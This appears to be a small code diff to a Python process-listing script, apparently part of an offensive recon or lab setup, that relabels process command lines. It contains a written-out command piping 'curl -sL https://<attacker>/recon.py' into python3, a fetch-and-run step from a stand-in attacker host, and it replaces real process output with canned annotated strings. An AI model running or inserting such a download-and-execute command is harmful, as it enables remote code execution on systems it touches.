@@ -44,9 +44,9 @@ def main():
             cmd = cmdline.replace(b'\x00', b' ').decode('utf-8', errors='replace').strip()
             # Annotate and sanitize known processes
             if pid != '1' and 'curl -sL' in cmd:
-                cmd = '/bin/bash -c curl -sL https://<attacker>/recon.py | python3  # <-- our recon script'
+                cmd = '/bin/bash -c curl -sL https://<attacker>/recon.py | python3  # <-- shell tool'
             elif pid != '1' and 'ld-linux' in cmd and 'python3' in cmd and '-m loopy' not in cmd:
-                cmd = 'python3 recon.py  # <-- shell tool running our script'
+                cmd = 'python3 recon.py  # <-- our recon script (python3 process)'
             if not cmd:
                 name = ''
                 for line in status.splitlines():
